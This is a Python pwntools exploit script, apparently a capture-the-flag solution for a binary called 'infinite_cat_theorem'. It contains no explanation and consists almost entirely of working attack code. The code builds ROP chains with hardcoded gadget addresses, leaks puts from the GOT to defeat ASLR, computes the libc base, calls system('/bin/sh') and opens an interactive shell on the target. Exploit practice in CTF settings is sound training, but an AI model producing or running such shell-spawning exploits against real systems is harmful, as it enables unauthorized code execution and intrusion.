from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./infinite_cat_theorem"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (">> ")


def menu (idx):
  rr ()
  r.sendline (str(idx))

def gen ():
  menu (1) 
  return r.recvline ()[:-1]

def submit ():
  menu (2)

def bye ():
  menu (3)


cmd = """
b * 0x000400e5e
b * 0x400b3a
c
"""

print gen ()
count = 1

for i in xrange (99):
  gen ()
  count += 1

while True:
  hh = gen ().decode ('hex')
  count += 1
  if "\n" not in hh and "\x00" not in hh:
    print count
    print hh.encode ('hex')
    break

getflag = 0x400DFE
bss = elf.bss (0x300)

prdi = 0x0000000000400ec3
read_func = 0x400ab9
leave = 0x0000000000400c30
#roppay = 

#bye ()
rr ()
pay = p64(0x602a30) + p64(prdi) + p64(0x602a30) + p64 (read_func)
read_input = 0x400ab5
r.send(pay)
puts = elf.plt["puts"]
system_offset = libc.symbols["system"]
puts_offset = libc.symbols["puts"]
prsip = 0x0000000000400ec1

pay = "/bin/sh\x00" + p64(prdi) + p64(elf.got["puts"]) + p64(puts) + p64(prdi) + p64(0x602a60) +  p64(prsip) + p64(0x100) * 2 + p64(read_input)
r.sendline (pay)
puts_leak = u64(r.recvline ()[:-1] + "\x00\x00")
libc_base = puts_leak - puts_offset
system = libc_base + system_offset
binsh = libc_base + next(libc.search("/bin/sh\x00"))
cmd = """
b * 0x0000000000400ec3
c
"""
#do_debug (cmd)
pay = p64(0x0000000000400ed0) * 10 + p64 (prdi) + p64 (binsh) + p64(system)
r.sendline (pay)
r.interactive ()
